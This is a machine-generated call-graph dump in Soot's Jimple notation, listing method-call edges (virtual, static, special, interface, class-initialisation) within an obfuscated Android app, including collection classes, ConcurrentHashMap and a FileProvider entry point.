VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r24) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: $r2 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getValue()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getValue()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.sun.misc.b: void <init>(sun.misc.Unsafe)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "maxDepth must be > 0 or -1") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: lsb B()>() in <lkq: java.util.Iterator iterator()> ==> <lkq: lsb B()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r8.<lme: lma d(java.lang.Object)>($r13) in <hbv: void j()> ==> <lme: lma d(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq h(java.lang.Object[],int)> ==> <lql: void <init>(java.lang.Object[],int)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r1.<lnc: void <init>(java.lang.Object)>($r0) in <izw: lsa w(java.lang.Object)> ==> <lnc: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(hff,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int b(java.lang.Object[],int)>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lrg: void <init>(java.lang.Object)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>($i1, $r1, $r2, null, null) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.s: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r5 = interfaceinvoke $r2.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljd: int b()> ==> <izw: int ak(int)>
SPECIAL edge: $z1 = specialinvoke $r2.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map: java.util.Set entrySet()>() in <lmb: lme f()> ==> <ljd: java.util.Set entrySet()>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljf: int o(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $i2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int b()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int b()>
STATIC edge: $i1 = staticinvoke <izw: int ak(int)>($i0) in <ljf: int b()> ==> <izw: int ak(int)>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.Enum: void <init>(java.lang.String,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
STATIC edge: staticinvoke <java.lang.Double: boolean isNaN(double)>($d0) in <lma: int e(int)> ==> <java.lang.Double: boolean isNaN(double)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<lme: lma c()>() in <hbv: void j()> ==> <lme: lma c()>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljd: void A(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void <init>()>() in <lmb: void <init>()> ==> <lli: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r6.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <ljf: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r6.<gwk: void a(gwm)>(r0) in <hcb: void <init>()> ==> <gwk: void a(gwm)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "Expected size must be >= 0") in <ljf: void i(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>($r1) in <kwe: miy x(java.lang.Object)> ==> <miv: void <init>(java.lang.Object)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("ar-XT", "bgp-XC", "bgp-XT", "bgq-PK", "bgq-XU", "bm-XF", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: void u(int,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: virtualinvoke r0.<ljf: void i(int)>(3) in <ljf: void <init>()> ==> <ljf: void i(int)>
CLINIT edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<lkq: java.lang.Object get(int)>($i0) in <lkm: java.lang.Object a(int)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r7, $i3, $r1, $i1, $i2) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: java.lang.Integer valueOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)> ==> <lma: void <init>()>
SPECIAL edge: specialinvoke $r3.<ivw: void <init>(ivv,java.lang.String)>(r0, $r2) in <ivv: ivw i(java.lang.String)> ==> <ivw: void <init>(ivv,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i7, $i5) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.String: void <init>()>() in <lsn: void <clinit>()> ==> <java.lang.String: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Parameter specified as non-null is null: method ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r0, 1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: int a(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: int a(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lqr: boolean m()>
VIRTUAL edge: virtualinvoke r0.<ljf: void j(int,java.lang.Object,int,int)>($i0, $r1, $i3, $i5) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void j(int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>(1, "the total number of elements must fit in an int") in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <iye: void y(boolean,java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
STATIC edge: $r4 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r4.<java.lang.Throwable: void <init>()>() in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.Throwable: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.StringBuilder: java.lang.String toString()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqm: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <lmo: lqs G(java.util.Comparator)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int c()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <lrg: int hashCode()>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(4) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lsn: void <init>(java.util.logging.Level)>($r1) in <lsd: void <init>(java.util.logging.Level)> ==> <lsn: void <init>(java.util.logging.Level)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid language \'%s\', fallback to \'en\'", $r0, $r4) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lwc: void <init>()>() in <lwe: void <init>()> ==> <lwc: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqp: java.lang.Object get(int)> ==> <iye: void O(int,int)>
STATIC edge: $r11 = staticinvoke <lma: lma p(java.util.Collection)>($r10) in <lmb: lme f()> ==> <lma: lma p(java.util.Collection)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lrg: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lkq: int hashCode()>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r5) in <ljf: boolean add(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsb: void <init>(int,int)>($i1, $i0) in <lkm: void <init>(lkq,int)> ==> <lsb: void <init>(int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma f()>() in <lkx: lma p()> ==> <lqq: lma f()>
INTERFACE edge: $z1 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: boolean hasNext()>
STATIC edge: $i5 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: lsa l()>
CLINIT edge: staticinvoke <lwf: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwf: void <clinit>()>
VIRTUAL edge: virtualinvoke r0.<nzh: void d()>() in <nzh: boolean f(ivv)> ==> <nzh: void d()>
VIRTUAL edge: virtualinvoke $r2.<j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>($r0, $l0, $r1) in <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)> ==> <j$.sun.misc.b: void l(java.lang.Object,long,java.lang.Object)>
STATIC edge: $i7 = staticinvoke <izw: int aj(java.lang.Object,int)>($r5, $i6) in <ljf: boolean add(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i0, $i1) in <lly: lma g()> ==> <lma: boolean x(int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int rotateLeft(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljd: int z(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void u(int,java.lang.Object)>($i0, $r2) in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: void u(int,java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void p()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
STATIC edge: $r0 = staticinvoke <lth: lth i(java.lang.String)>("EntryStoreHelper") in <hnc: void <clinit>()> ==> <lth: lth i(java.lang.String)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
STATIC edge: $r1 = staticinvoke <luk: lum a(java.lang.String[])>($r0) in <luk: void <clinit>()> ==> <luk: lum a(java.lang.String[])>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ThreadLocalRandom: void <clinit>()>
STATIC edge: staticinvoke <iye: void I(boolean,java.lang.Object)>($z0, "Arrays already allocated") in <ljd: int b()> ==> <iye: void I(boolean,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
CLINIT edge: staticinvoke <hnc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnc: void <clinit>()>
SPECIAL edge: specialinvoke $r8.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <lvr: void <init>(java.util.List)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
STATIC edge: $r2 = staticinvoke <lvm: lum j()>() in <luk: lum a(java.lang.String[])> ==> <lvm: lum j()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljf: int o(int,int,int,int)> ==> <izw: int af(int,int)>
STATIC edge: $r4 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r1) in <hcb: void <init>()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int c()>() in <lje: void <init>(ljf)> ==> <ljf: int c()>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <ljf: java.util.Iterator iterator()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int numberOfLeadingZeros(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <lqr: java.util.Iterator iterator()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqr: lsa l()>() in <lqr: java.util.Iterator iterator()> ==> <lqr: lsa l()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <ivw: boolean O(char)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: $i0 = staticinvoke <izw: int af(int,int)>($i0, $i1) in <ljd: int f(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i1) in <ljf: int b()> ==> <ljf: void q(int)>
SPECIAL edge: specialinvoke $r23.<jhe: void <init>(lak,lsr,int,byte[])>($r10, $r1, 20, null) in <lsd: boolean b(lsr)> ==> <jhe: void <init>(lak,lsr,int,byte[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void set(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void set(long)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
INTERFACE edge: $r6 = interfaceinvoke $r4.<java.util.Set: java.util.Iterator iterator()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void c(java.lang.Object,java.lang.String)>($r3, "copyOf(this, newSize)") in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ojg: void c(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.NullPointerException: void <init>(java.lang.String)>($r2) in <ojg: void v(java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int d(int)>($i0) in <ljf: java.util.Set f()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r3) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lql: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r0, 0, $r0, 0, 0) in <lqr: void <clinit>()> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
